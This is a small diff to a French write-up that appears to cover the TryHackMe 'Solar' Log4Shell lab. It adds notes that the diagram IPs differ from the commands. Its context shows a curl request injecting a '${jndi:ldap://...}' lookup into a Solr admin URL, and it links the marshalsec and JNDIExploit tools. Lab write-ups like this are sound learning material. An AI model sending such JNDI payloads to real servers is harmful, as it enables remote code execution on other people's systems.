@@ -330,7 +330,7 @@ On arrive pas à produire le log qu'on veut côté Solr. Les = sont url décodé
 
 [https://github.com/mbechler/marshalsec](https://github.com/mbechler/marshalsec)
 
-Plan :
+Plan (*attention les IP ne correspondent pas aux commandes ci-dessous*) :
 
 ![avec marshalsec v1](doc/thm_solar.drawio.svg?raw=true)
 
@@ -396,7 +396,7 @@ curl 'http://10.10.106.228:8983/solr/admin/cores?foo=$\{jndi:ldap://10.9.2.236:1
 
 [https://github.com/avergnaud/JNDIExploit](https://github.com/avergnaud/JNDIExploit)
 
-Plan :
+Plan (*attention les IP ne correspondent pas aux commandes ci-dessous*) :
 
 ![avec JNDIExploit](doc/thm_solar_v2.drawio.svg?raw=true)
 
